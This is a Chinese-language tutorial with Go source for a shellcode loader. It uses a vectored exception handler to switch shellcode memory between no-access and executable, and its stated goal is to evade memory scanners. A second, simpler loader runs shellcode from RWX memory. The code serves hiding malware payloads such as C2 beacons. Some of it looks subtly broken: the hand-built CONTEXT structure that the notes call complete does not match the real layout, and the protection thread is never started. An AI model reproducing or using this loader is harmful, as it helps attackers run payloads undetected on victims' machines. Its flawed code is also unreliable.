# VEH内存保护技术（修复版）

## 原理

- 使用VEH（Vectored Exception Handler）异常处理器
- 将shellcode内存区域设置为PAGE_NOACCESS
- 执行时触发异常，VEH处理器切换为PAGE_EXECUTE_READ
- 执行后再次设置为PAGE_NOACCESS
- 规避内存扫描

---

## Go实现

```go
package main

import (
    "golang.org/x/sys/windows"
    "syscall"
    "unsafe"
)

var (
    shellcodeAddr  uintptr
    shellcodeSize  uintptr
    hEvent         windows.Handle
    BeaconProtect  uint32
)

// 完整的CONTEXT结构（Windows x64）
type CONTEXT struct {
    P1Home         uint64
    P2Home         uint64
    P3Home         uint64
    P4Home         uint64
    P5Home         uint64
    P6Home         uint64
    ContextFlags   uint32
    MxCsr          uint32
    SegCs          uint16
    SegDs          uint16
    SegEs          uint16
    SegFs          uint16
    SegGs          uint16
    SegSs          uint16
    EFlags         uint32
    Dr0            uint64
    Dr1            uint64
    Dr2            uint64
    Dr3            uint64
    Dr6            uint64
    Dr7            uint64
    Rax            uint64
    Rbx            uint64
    Rcx            uint64
    Rdx            uint64
    Rsi            uint64
    Rdi            uint64
    R8             uint64
    R9             uint64
    R10            uint64
    R11            uint64
    R12            uint64
    R13            uint64
    R14            uint64
    R15            uint64
    Rbp            uint64
    Rip            uint64  // 当前执行地址
    Rsp            uint64
    SegSs2         uint16
    _              [2]byte // padding
}

type EXCEPTION_RECORD struct {
    ExceptionCode        uint32
    ExceptionFlags       uint32
    ExceptionRecord      uintptr
    ExceptionAddress     uintptr
    NumberParameters     uint32
    ExceptionInformation [15]uintptr
}

// VEH异常处理器
func vehHandler(exceptionCode uintptr, exceptionRecord uintptr,
    context uintptr, _ uintptr) uintptr {

    // 获取异常记录
    exRecord := (*EXCEPTION_RECORD)(unsafe.Pointer(exceptionRecord))
    
    // 检查是否是访问违规异常
    if exRecord.ExceptionCode != 0xC0000005 {
        return 1 // EXCEPTION_CONTINUE_SEARCH
    }
    
    // 获取上下文
    ctx := (*CONTEXT)(unsafe.Pointer(context))
    
    // 检查RIP是否在shellcode范围内
    if ctx.Rip >= shellcodeAddr && ctx.Rip < shellcodeAddr + shellcodeSize {
        // 修改内存保护为PAGE_EXECUTE_READ
        kernel32 := windows.NewLazySystemDLL("kernel32.dll")
        VirtualProtect := kernel32.NewProc("VirtualProtect")
        
        VirtualProtect.Call(shellcodeAddr, shellcodeSize,
            0x20, // PAGE_EXECUTE_READ
            uintptr(unsafe.Pointer(&BeaconProtect)))
        
        // 触发事件通知保护线程
        windows.SetEvent(hEvent)
        
        return 0 // EXCEPTION_CONTINUE_EXECUTION
    }
    
    return 1 // EXCEPTION_CONTINUE_SEARCH
}

// 内存保护线程
func memoryProtectThread() {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    for {
        // 等待事件
        windows.WaitForSingleObject(hEvent, windows.INFINITE)
        
        // 设置PAGE_NOACCESS
        VirtualProtect.Call(shellcodeAddr, shellcodeSize,
            0x01, // PAGE_NOACCESS
            uintptr(unsafe.Pointer(&BeaconProtect)))
        
        // 重置事件
        windows.ResetEvent(hEvent)
    }
}

// 初始化VEH保护
func initVEHProtection(addr uintptr, size uintptr) {
    shellcodeAddr = addr
    shellcodeSize = size
    
    // 创建事件
    hEvent, _ = windows.CreateEvent(nil, 0, 0, nil)
    
    // 注册VEH处理器
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    AddVectoredExceptionHandler := kernel32.NewProc("AddVectoredExceptionHandler")
    
    handler := syscall.NewCallback(vehHandler)
    AddVectoredExceptionHandler.Call(1, handler)
    
    // 启动保护线程（简化版，不创建线程）
    // 在实际使用中需要创建独立线程
}

// 执行shellcode（VEH保护版）
func executeShellcodeWithVEH(sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    CreateThread := kernel32.NewProc("CreateThread")
    
    // 1. 分配内存（初始PAGE_NOACCESS）
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x01)
    
    // 2. 临时改为可写
    var oldProtect uint32
    VirtualProtect.Call(addr, uintptr(len(sc)), 0x04, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 3. 复制shellcode
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
    
    // 4. 改回PAGE_NOACCESS
    VirtualProtect.Call(addr, uintptr(len(sc)), 0x01, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 5. 初始化VEH保护
    initVEHProtection(addr, uintptr(len(sc)))
    
    // 6. 创建线程执行（会触发异常由VEH处理）
    CreateThread.Call(0, 0, addr, 0, 0, 0)

    // 7. 等待（使用kernel32.Sleep）
    Sleep := kernel32.NewProc("Sleep")
    Sleep.Call(5000)
}
```

---

## 简化版（推荐）

VEH保护比较复杂，建议使用简单的内存保护切换：

```go
// 简化版：执行前RWX，执行后NOACCESS
func executeShellcodeSimpleProtection(sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    CreateThread := kernel32.NewProc("CreateThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
    
    // 分配RWX内存
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x40)
    
    // 复制shellcode
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
    
    // 创建线程
    thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
    
    // 等待执行完成
    WaitForSingleObject.Call(thread, 0xFFFFFFFF)
    
    // 执行后设置为PAGE_NOACCESS
    var oldProtect uint32
    VirtualProtect.Call(addr, uintptr(len(sc)), 0x01, uintptr(unsafe.Pointer(&oldProtect)))
}
```

---

## 注意事项

1. **VEH复杂**：VEH保护需要复杂的异常处理，容易出错
2. **推荐简化版**：执行后立即设置为PAGE_NOACCESS，简单有效
3. **CONTEXT结构**：必须完整定义，否则访问Rip会出错
4. **内存保护**：执行时用RWX，执行后用NOACCESS或RX
5. **不推荐VEH**：除非有特殊需求，VEH可能引发不稳定